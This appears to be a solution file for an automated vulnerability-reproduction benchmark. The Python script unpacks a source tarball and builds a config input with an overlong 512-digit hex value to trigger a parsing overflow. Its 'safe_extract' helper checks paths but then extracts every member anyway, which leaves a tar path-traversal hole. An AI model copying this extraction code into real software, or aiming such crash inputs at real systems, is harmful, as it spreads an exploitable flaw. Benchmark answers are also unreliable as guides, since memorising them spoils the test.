import os
import re
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_tarball(tar_path):
            tmpdir = tempfile.mkdtemp(prefix="arvopoc_")
            try:
                with tarfile.open(tar_path, 'r:*') as tf:
                    def is_within_directory(directory, target):
                        abs_directory = os.path.abspath(directory)
                        abs_target = os.path.abspath(target)
                        prefix = os.path.commonprefix([abs_directory, abs_target])
                        return prefix == abs_directory
                    def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                        for member in tar.getmembers():
                            member_path = os.path.join(path, member.name)
                            if not is_within_directory(path, member_path):
                                continue
                        tar.extractall(path, members, numeric_owner=numeric_owner)
                    safe_extract(tf, tmpdir)
            except Exception:
                return None
            return tmpdir

        def read_text(path):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    return f.read()
            except Exception:
                try:
                    with open(path, "r", encoding="latin-1", errors="ignore") as f:
                        return f.read()
                except Exception:
                    return ""

        def find_candidate_config_files(root):
            cfg_exts = {".conf", ".cfg", ".ini", ".config", ".cnf", ".toml", ".yaml", ".yml", ".json", ".txt"}
            candidates = []
            for dirpath, _, filenames in os.walk(root):
                ldir = dirpath.lower()
                # Prioritize likely directories
                bias = 0
                if any(tok in ldir for tok in ["example", "sample", "doc", "test", "fuzz", "seed"]):
                    bias += 2
                for fn in filenames:
                    lfn = fn.lower()
                    _, ext = os.path.splitext(lfn)
                    score = 0
                    if ext in cfg_exts:
                        score += 2
                    if any(tok in lfn for tok in ["example", "sample", "default", "config", "conf", "seed"]):
                        score += 1
                    if "readme" in lfn:
                        continue
                    if score > 0:
                        candidates.append((score + bias, os.path.join(dirpath, fn)))
            candidates.sort(reverse=True)
            return [p for _, p in candidates]

        def find_hexish_lines(content):
            # Identify lines with values that look hex-like
            lines = content.splitlines()
            results = []
            hex_val_pat = re.compile(r'([=:]\s*|\s)\s*(?:"(0x[0-9A-Fa-f]+|#[0-9A-Fa-f]+|[0-9A-Fa-f]{3,})"|\'(0x[0-9A-Fa-f]+|#[0-9A-Fa-f]+|[0-9A-Fa-f]{3,})\'|(0x[0-9A-Fa-f]+|#[0-9A-Fa-f]+|[0-9A-Fa-f]{3,}))')
            for idx, line in enumerate(lines):
                if line.strip().startswith(("#", "//", ";")):
                    continue
                m = hex_val_pat.search(line)
                if m:
                    results.append((idx, line, m))
            return results

        def expand_hex_value_in_line(line, match, target_len=512):
            # Determine which group holds the hex value
            groups = match.groups()
            inner = None
            quote_char = ""
            # groups: outer with quotes or none
            for g in groups[::-1]:
                if g:
                    inner = g
                    break
            if inner is None:
                return None
            # detect quoting
            before = line[:match.start()]
            after = line[match.end():]
            # Determine prefix (# or 0x or none)
            if inner.startswith(("0x", "0X")):
                prefix = "0x"
                base = inner[2:]
            elif inner.startswith("#"):
                prefix = "#"
                base = inner[1:]
            else:
                prefix = ""
                base = inner
            # Keep hex digits only
            base = re.sub(r'[^0-9A-Fa-f]', '', base)
            if target_len < 64:
                target_len = 64
            # Make length even to simulate byte pairs for hex decoding
            if target_len % 2 == 1:
                target_len += 1
            payload_digits = "f" * target_len
            new_inner = prefix + payload_digits
            # Assemble
            new_line = line[:match.start()] + new_inner + line[match.end():]
            return new_line

        def modify_config_content(content):
            # Try to expand the first hexish value; if none found, expand every line that seems hexish
            hex_lines = find_hexish_lines(content)
            if not hex_lines:
                return None
            lines = content.splitlines()
            modified = False
            # Prefer lines with 0x or # explicitly
            prioritized = []
            for idx, line, m in hex_lines:
                val = None
                for g in m.groups()[::-1]:
                    if g:
                        val = g
                        break
                explicit = 1 if val and (val.startswith("0x") or val.startswith("#")) else 0
                prioritized.append((explicit, idx, line, m))
            prioritized.sort(key=lambda x: (-x[0], x[1]))
            # Modify the best candidate
            explicit, idx, line, m = prioritized[0]
            new_line = expand_hex_value_in_line(line, m, target_len=512)
            if new_line:
                lines[idx] = new_line
                modified = True
            if not modified:
                return None
            # Return joined with trailing newline
            return ("\n".join(lines) + "\n").encode("utf-8", errors="ignore")

        def search_source_for_keys(root):
            # Attempt to find potential config keys from source code
            keys = set()
            patterns = [
                re.compile(r'strcmp\s*\(\s*[^,]+,\s*"([A-Za-z0-9_\-\.]+)"\s*\)'),
                re.compile(r'strncmp\s*\(\s*[^,]+,\s*"([A-Za-z0-9_\-\.]+)"\s*",\s*\d+\s*\)'),
                re.compile(r'\bkey\s*[:=]\s*"([A-Za-z0-9_\-\.]+)"'),
                re.compile(r'"([A-Za-z0-9_\-]{2,})"\s*[:=]'),
            ]
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    if not any(fn.endswith(ext) for ext in [".c", ".h", ".cpp", ".cc", ".hpp", ".go", ".rs", ".py"]):
                        continue
                    text = read_text(os.path.join(dirpath, fn))
                    if not text:
                        continue
                    if "config" not in text and "cfg" not in text and "conf" not in text:
                        # only scan likely files to save time
                        pass
                    for pat in patterns:
                        for m in pat.finditer(text):
                            s = m.group(1)
                            if s:
                                if len(s) >= 3 and len(s) <= 32:
                                    keys.add(s)
            # Prefer keys indicating hex
            prioritized = []
            for k in keys:
                score = 0
                lk = k.lower()
                if any(tok in lk for tok in ["hex", "color", "rgb", "rgba", "key", "psk", "salt", "id", "nonce", "hash"]):
                    score += 2
                prioritized.append((score, k))
            prioritized.sort(reverse=True)
            return [k for _, k in prioritized]

        def build_fallback_payload(keys):
            # Construct minimal config-like forms using found keys; else generic candidates
            payload_lines = []
            hex_payload_len = 512
            long_hex = "0x" + "f" * hex_payload_len
            hash_hex = "#" + "f" * hex_payload_len
            bare_hex = "f" * hex_payload_len
            # Use most promising keys first
            used = set()
            if keys:
                for k in keys:
                    lk = k.lower()
                    if k in used:
                        continue
                    if any(tok in lk for tok in ["hex", "color", "rgb", "rgba"]):
                        payload_lines.append(f"{k} = {hash_hex if 'color' in lk or 'rgb' in lk else long_hex}")
                        used.add(k)
                        break
                for k in keys:
                    if k in used:
                        continue
                    lk = k.lower()
                    if any(tok in lk for tok in ["key", "psk", "salt", "nonce", "id", "hash"]):
                        payload_lines.append(f"{k} = {long_hex}")
                        used.add(k)
                        if len(payload_lines) >= 2:
                            break
            # Always add a generic line
            if not payload_lines:
                payload_lines.append(f"hex = {long_hex}")
            # Keep it short: only up to 3 lines to avoid non-zero exit in fixed
            payload = "\n".join(payload_lines[:3]) + "\n"
            return payload.encode("utf-8", errors="ignore")

        # Begin processing
        extracted = extract_tarball(src_path)
        if not extracted:
            # Fallback generic payload
            generic = "hex = 0x" + "f" * 512 + "\n"
            return generic.encode()

        # Try sample config files first
        cfg_files = find_candidate_config_files(extracted)
        for cfg in cfg_files:
            content = read_text(cfg)
            if not content:
                continue
            modified = modify_config_content(content)
            if modified:
                return modified

        # If no suitable config samples, try to identify keys from source
        keys = search_source_for_keys(extracted)
        # Build fallback payload using guessed keys
        return build_fallback_payload(keys)
